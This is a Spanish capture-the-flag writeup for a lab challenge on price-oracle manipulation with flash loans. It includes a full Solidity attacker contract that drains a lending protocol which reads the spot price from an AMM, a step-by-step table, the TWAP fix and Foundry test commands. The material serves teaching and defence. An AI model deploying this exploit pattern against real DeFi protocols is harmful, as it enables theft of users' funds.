# C7. Manipulación de oráculos y préstamos flash: writeup

Este documento explica cómo resolver el reto del caso C7. El análisis completo está en la sección 4.7 de la memoria.

## El reto: El Oráculo Manipulable

En Polonio el reto se llama `OraculoManipulable` y despliega cinco contratos: `TokenReto`, `UsdcReto`, `AmmReto`, `PrestamistaFlash` y `PrestamosVulnerable`. En el laboratorio, los equivalentes están en `src/C7-oraculo-flashloan/Vulnerable.sol`.

**Escenario.**

- Un AMM de producto constante tiene 100 TOKEN y 100.000 USDC, así que el precio justo es de 1.000 USDC por TOKEN.
- Un prestamista flash ofrece hasta 900.000 USDC sin comisión, con la condición de devolverlos en la misma transacción.
- Un protocolo de préstamos tiene 100.000 USDC para prestar y deja pedir tanto como valga el colateral depositado.
- Tú tienes 1 TOKEN, que vale unos 1.000 USDC.

**Objetivo.** Dejar el protocolo de préstamos sin USDC. El reto se da por resuelto cuando `PrestamosVulnerable.isSolved()` devuelve `true`.

## La vulnerabilidad

```solidity
// FALLO: precio spot leído directo de las reservas.
function precioToken() public view returns (uint256) {
    (uint256 rt, uint256 ru) = amm.getReserves();
    return (ru * 1e18) / rt;
}

function pedir(uint256 amt) external {
    uint256 maxDeuda = (colateral[msg.sender] * precioToken()) / 1e18;
    require(deuda[msg.sender] + amt <= maxDeuda, "sobre-colateralizado");
    deuda[msg.sender] += amt;
    usdc.transfer(msg.sender, amt);
}
```

El protocolo valora tu colateral con el precio *spot* del AMM: el cociente de sus reservas en ese instante. Ese precio lo puede mover cualquiera con un intercambio grande, dentro de la misma transacción en la que luego pide el préstamo.

Mover el precio exige mucho capital, y ahí entra el préstamo flash. No es la causa del fallo, que está en el oráculo, pero elimina la barrera del capital: puedes disponer de 900.000 USDC durante una transacción sin tenerlos.

## Resolución paso a paso

Todo tiene que ocurrir en una sola transacción, así que hace falta un contrato. El prestamista llama a su función `onFlashLoan` mientras dura el préstamo:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Contrato que el jugador escribe y despliega desde la consola de Polonio.
interface ITok {
    function balanceOf(address a) external view returns (uint256);
    function approve(address s, uint256 a) external returns (bool);
    function transfer(address to, uint256 a) external returns (bool);
}
interface IAmmR {
    function swapUsdcForToken(uint256 usdcIn) external returns (uint256);
    function swapTokenForUsdc(uint256 tokenIn) external returns (uint256);
}
interface IFlash {
    function flashLoan(uint256 amount) external;
}
interface IPrest {
    function depositar(uint256 amt) external;
    function pedir(uint256 amt) external;
}

contract AtacanteOraculo {
    ITok immutable token;
    ITok immutable usdc;
    IAmmR immutable amm;
    IFlash immutable lender;
    IPrest immutable prestamos;
    address immutable jugador;

    constructor(address t, address u, address a, address l, address p) {
        token = ITok(t);
        usdc = ITok(u);
        amm = IAmmR(a);
        lender = IFlash(l);
        prestamos = IPrest(p);
        jugador = msg.sender;
    }

    // Antes de llamar, el jugador transfiere a este contrato su 1 TOKEN.
    function atacar() external {
        lender.flashLoan(900_000e18);
        // Beneficio para el jugador.
        usdc.transfer(jugador, usdc.balanceOf(address(this)));
    }

    function onFlashLoan(uint256 amount) external {
        require(msg.sender == address(lender), "solo el prestamista");
        // 1. Inflar el precio spot del TOKEN con todo el USDC prestado.
        usdc.approve(address(amm), amount);
        amm.swapUsdcForToken(amount);
        // 2. Depositar 1 TOKEN propio y pedir todo el USDC del protocolo.
        token.approve(address(prestamos), 1e18);
        prestamos.depositar(1e18);
        prestamos.pedir(100_000e18);
        // 3. Deshacer el swap y recuperar el capital.
        uint256 restante = token.balanceOf(address(this));
        token.approve(address(amm), restante);
        amm.swapTokenForUsdc(restante);
        // 4. Devolver el préstamo flash.
        usdc.transfer(address(lender), amount);
    }
}
```

1. **Desplegar `AtacanteOraculo`** pasándole, en este orden, las direcciones de `TokenReto`, `UsdcReto`, `AmmReto`, `PrestamistaFlash` y `PrestamosVulnerable`.
2. **Transferirle tu TOKEN:** `TokenReto.transfer(<atacante>, 1000000000000000000)`.
3. **Llamar a `atacar()`.** Dentro de esa única transacción ocurre lo siguiente:

   | Paso | Acción | Reservas del AMM | Precio *spot* del TOKEN |
   |---|---|---|---|
   | 1 | Préstamo flash de 900.000 USDC | 100 TOKEN / 100.000 USDC | 1.000 USDC |
   | 2 | Cambiar 900.000 USDC por TOKEN (recibes 90) | 10 TOKEN / 1.000.000 USDC | 100.000 USDC |
   | 3 | Depositar 1 TOKEN y pedir 100.000 USDC | sin cambios | 100.000 USDC |
   | 4 | Cambiar los 90 TOKEN por USDC (recibes 900.000) | 100 TOKEN / 100.000 USDC | 1.000 USDC |
   | 5 | Devolver los 900.000 USDC al prestamista | sin cambios | 1.000 USDC |

   En el paso 3, el protocolo valora tu único TOKEN en 100.000 USDC y te presta todo lo que tiene.
4. **Cobrar.** Al terminar, el contrato te envía los 100.000 USDC de beneficio. El precio ha vuelto a 1.000 USDC, así que el protocolo tiene una deuda de 100.000 USDC respaldada por un colateral que vale 1.000.
5. **Verificar.** `PrestamosVulnerable.isSolved()` devuelve `true`.

Las cuentas cuadran de forma exacta porque el AMM del reto no cobra comisiones. En un AMM real, las comisiones de los dos intercambios serían el coste del ataque.

## Mitigación

La versión corregida (`src/C7-oraculo-flashloan/Fixed.sol`) valora el colateral con un precio medio ponderado en el tiempo (TWAP), como el que introdujo Uniswap V2:

1. El AMM mantiene un acumulador que suma, en cada actualización, el precio vigente multiplicado por los segundos que ha estado vigente. Se actualiza **antes** de cambiar las reservas, de modo que el precio que deja un intercambio solo empieza a contar cuando pasa el tiempo.
2. `OraculoTWAP.precio()` devuelve la media del precio desde la última observación, siempre que haya pasado al menos la ventana fijada (30 minutos en el reto).

Dentro de un mismo bloque la marca de tiempo no avanza, así que la manipulación pesa cero en la media. El mismo ataque revierte con `sobre-colateralizado`, porque el TOKEN sigue valiendo 1.000.

En producción, la alternativa más extendida es un oráculo externo como Chainlink, comprobando siempre que el dato es reciente. Como defensa en profundidad, conviene prestar solo una fracción del valor del colateral (el reto presta el 100 %, una simplificación) y combinar dos fuentes de precio.

**Riesgo residual.** El coste de manipular un TWAP crece con la liquidez del pool y con la duración de la ventana, pero no es infinito: con poca liquidez y una ventana corta, se puede mover el precio durante varios bloques con capital propio. Es lo que ocurrió en Inverse Finance en abril de 2022.

## Comprobarlo en el laboratorio

```bash
./forge test --match-contract C7_OraculoFlashloan
./forge test --match-contract C7_OraculoFlashloan --match-test test_Exploit_Vulnerable -vvvv
FOUNDRY_PROFILE=polonio ./forge test --match-test test_C7
```

La última orden ejecuta la simulación del reto tal como se despliega en Polonio (`polonio/simulacion/`).

| Prueba | Qué comprueba |
|---|---|
| `test_Exploit_Vulnerable` | El protocolo queda sin USDC, el atacante gana 100.000 USDC y el precio vuelve a 1.000 |
| `test_Fixed_Resiste` | Con el TWAP, el mismo ataque revierte con `sobre-colateralizado` |
| `test_Fixed_TWAP_NoSeMueveEnUnBloque` | Una compra de 900.000 USDC multiplica por 100 el precio *spot*, pero no el TWAP del mismo bloque |
